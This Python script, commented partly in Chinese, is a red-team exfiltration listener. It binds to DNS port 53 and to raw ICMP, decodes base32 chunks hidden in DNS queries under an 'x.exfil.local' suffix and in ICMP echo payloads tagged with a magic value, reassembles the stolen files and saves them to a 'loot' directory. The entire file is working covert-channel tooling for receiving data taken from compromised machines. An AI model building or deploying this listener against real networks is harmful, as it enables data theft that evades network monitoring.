#!/usr/bin/env python3
"""
Red Team - Exfil Listener (攻擊機 WSL2 端)
接收 DNS/ICMP 隱蔽通道外傳資料，重組並安全儲存
Usage: sudo python3 exfil_listener.py [LISTEN_IP]
"""

import socket
import struct
import os
import sys
import re
import base64
import hashlib
import select
import time

# ── Config ────────────────────────────────────────────────────────────
LISTEN_IP = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
LOOT_DIR = "./loot"
TIMEOUT = 300
MAX_FILE_SIZE = 10 * 1024 * 1024

# ── Reassembly State ──────────────────────────────────────────────────
files = {}

def get_file(file_id):
    if file_id not in files:
        files[file_id] = {
            "chunks": {}, "filename": None, "total": None, "checksum": None
        }
    return files[file_id]

# ── Security: Privilege Drop ──────────────────────────────────────────
def drop_privileges():
    if os.getuid() == 0:
        uid = int(os.environ.get("SUDO_UID", 1000))
        gid = int(os.environ.get("SUDO_GID", 1000))
        os.setgid(gid)
        os.setuid(uid)
        print(f"[*] Dropped privileges to UID={uid}")

# ── Security: Safe File Write ─────────────────────────────────────────
def safe_write(filename, data):
    os.makedirs(LOOT_DIR, exist_ok=True)
    safe_name = os.path.basename(filename) or "unknown"
    path = os.path.join(LOOT_DIR, safe_name)
    if os.path.exists(path):
        i = 1
        while os.path.exists(f"{path}.{i}"):
            i += 1
        path = f"{path}.{i}"
    fd = os.open(path, os.O_CREAT | os.O_WRONLY, 0o600)
    with os.fdopen(fd, 'wb') as f:
        f.write(data)
    print(f"[+] Saved: {path} ({len(data)} bytes)")

# ── Reassembly Engine ─────────────────────────────────────────────────
def try_reassemble(file_id):
    info = files.get(file_id)
    if not info or info["total"] is None or info["filename"] is None:
        return
    if len(info["chunks"]) < info["total"]:
        return

    raw = b""
    for i in range(info["total"]):
        chunk = info["chunks"].get(i)
        if chunk is None:
            print(f"[-] Missing chunk {i} for {file_id}")
            return
        raw += chunk

    if len(raw) > MAX_FILE_SIZE:
        print(f"[-] {file_id} exceeds 10MB, dropping")
        del files[file_id]
        return

    if info["checksum"]:
        actual = hashlib.md5(raw).hexdigest()[:8]
        if actual != info["checksum"]:
            print(f"[!] Checksum mismatch {file_id}: want={info['checksum']} got={actual}")
        else:
            print(f"[+] Checksum verified: {file_id}")

    try:
        decoded = base64.b64decode(raw)
    except Exception:
        decoded = raw

    safe_write(info["filename"], decoded)
    del files[file_id]

# ── DNS Packet Parser ─────────────────────────────────────────────────
def parse_dns_name(data, offset):
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if length & 0xC0 == 0xC0:
            offset += 2
            break
        offset += 1
        labels.append(data[offset:offset + length].decode('ascii', errors='ignore'))
        offset += length
    return ".".join(labels)

def make_dns_response(query_data):
    if len(query_data) < 12:
        return None
    resp = bytearray(query_data[:12])
    resp[2] = 0x81
    resp[3] = 0x83  # NXDOMAIN
    resp[6:12] = b'\x00\x00\x00\x00\x00\x00'
    resp += query_data[12:]
    return bytes(resp)

def handle_dns(data, addr, dns_sock):
    if len(data) < 12:
        return
    domain = parse_dns_name(data, 12)
    if not domain:
        return

    resp = make_dns_response(data)
    if resp:
        dns_sock.sendto(resp, addr)

    parts = domain.split(".")

    # Find x.exfil.local suffix
    try:
        idx = None
        for i in range(len(parts) - 2):
            if parts[i] == "x" and parts[i + 1] == "exfil" and parts[i + 2] == "local":
                idx = i
                break
        if idx is None or idx < 2:
            return
    except IndexError:
        return

    file_id = parts[idx - 1]
    prefix_parts = parts[:idx - 1]

    if not prefix_parts:
        return

    # START signal: START.<fname_b32>.<file_id>.x.exfil.local
    if prefix_parts[0].upper() == "START" and len(prefix_parts) >= 2:
        fname_b32 = prefix_parts[1].upper()
        fname_b32 += "=" * (-len(fname_b32) % 8)
        try:
            filename = base64.b32decode(fname_b32).decode('utf-8', errors='replace')
        except Exception:
            filename = prefix_parts[1]
        get_file(file_id)["filename"] = filename
        print(f"[+] START file={filename} id={file_id}")
        return

    # END signal: END.<md5_8chars>.<file_id>.x.exfil.local
    if prefix_parts[0].upper() == "END" and len(prefix_parts) >= 2:
        checksum = prefix_parts[1]
        get_file(file_id)["checksum"] = checksum
        print(f"[+] END id={file_id} checksum={checksum}")
        try_reassemble(file_id)
        return

    # Data: <seq>-<total>.<b32data>.<file_id>.x.exfil.local
    if len(prefix_parts) < 2:
        return
    match = re.match(r'^(\d+)-(\d+)$', prefix_parts[0])
    if not match:
        return
    seq = int(match.group(1))
    total = int(match.group(2))
    chunk_b32 = prefix_parts[1].upper()
    chunk_b32 += "=" * (-len(chunk_b32) % 8)

    try:
        chunk_data = base64.b32decode(chunk_b32)
    except Exception:
        return

    info = get_file(file_id)
    info["total"] = total
    info["chunks"][seq] = chunk_data

    received = len(info["chunks"])
    if received % 10 == 0 or received == total:
        print(f"[+] {file_id}: {received}/{total} chunks")

    try_reassemble(file_id)

# ── ICMP Packet Parser ────────────────────────────────────────────────
ICMP_MAGIC = 0xEFBE

def handle_icmp(data):
    if len(data) < 28:
        return
    ihl = (data[0] & 0x0F) * 4
    if data[ihl] != 8:  # Not echo request
        return

    payload = data[ihl + 8:]
    if len(payload) < 16:
        return

    # Search for magic marker in payload (may be offset by timestamp)
    magic_offset = -1
    for offset in (0, 8, 16):
        if offset + 2 <= len(payload):
            if struct.unpack('>H', payload[offset:offset + 2])[0] == ICMP_MAGIC:
                magic_offset = offset
                break
    if magic_offset < 0:
        return

    p = payload[magic_offset:]
    if len(p) < 16:
        return

    # Bytes 0-1: magic (0xEFBE)
    # Byte 2: type (0=data, 1=START, 2=END)
    # Bytes 3-4: file_id
    # Bytes 5-15: payload (11 bytes)
    ptype = p[2]
    file_id = p[3:5].hex()

    if ptype == 0x01:  # START
        filename = p[5:16].rstrip(b'\x00').decode('utf-8', errors='replace')
        get_file(file_id)["filename"] = filename
        print(f"[+] ICMP START file={filename} id={file_id}")
        return

    if ptype == 0x02:  # END
        checksum = p[5:13].decode('ascii', errors='ignore').rstrip('\x00')
        get_file(file_id)["checksum"] = checksum
        print(f"[+] ICMP END id={file_id} checksum={checksum}")
        try_reassemble(file_id)
        return

    if ptype == 0x00:  # DATA
        seq = struct.unpack('>H', p[5:7])[0]
        total = struct.unpack('>H', p[7:9])[0]
        chunk_data = p[9:16]  # 7 bytes per chunk

        info = get_file(file_id)
        info["total"] = total
        info["chunks"][seq] = chunk_data

        received = len(info["chunks"])
        if received % 10 == 0 or received == total:
            print(f"[+] ICMP {file_id}: {received}/{total} chunks")

        try_reassemble(file_id)

# ── Main ──────────────────────────────────────────────────────────────
def main():
    print("[*] Exfil Listener starting...")
    print(f"[*] Listen IP: {LISTEN_IP}")
    print(f"[*] Loot dir: {os.path.abspath(LOOT_DIR)}")

    dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    dns_sock.bind((LISTEN_IP, 53))
    print(f"[+] DNS listener bound to {LISTEN_IP}:53")

    icmp_sock = None
    try:
        icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        print("[+] ICMP listener active")
    except PermissionError:
        print("[!] ICMP needs root — DNS-only mode")

    drop_privileges()

    print(f"[*] Timeout: {TIMEOUT}s")
    print("[*] Waiting for exfil data...\n")

    sockets = [dns_sock]
    if icmp_sock:
        sockets.append(icmp_sock)

    start_time = time.time()
    try:
        while True:
            elapsed = time.time() - start_time
            if elapsed > TIMEOUT:
                print(f"\n[*] Timeout ({TIMEOUT}s), shutting down")
                break
            readable, _, _ = select.select(sockets, [], [], 1.0)
            for sock in readable:
                try:
                    if sock == dns_sock:
                        data, addr = dns_sock.recvfrom(4096)
                        handle_dns(data, addr, dns_sock)
                    elif sock == icmp_sock:
                        data, addr = icmp_sock.recvfrom(65535)
                        handle_icmp(data)
                except Exception:
                    continue
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
    finally:
        dns_sock.close()
        if icmp_sock:
            icmp_sock.close()
        print("[*] Listener stopped")
        if files:
            print(f"[!] {len(files)} incomplete file(s) still in buffer")

if __name__ == "__main__":
    main()
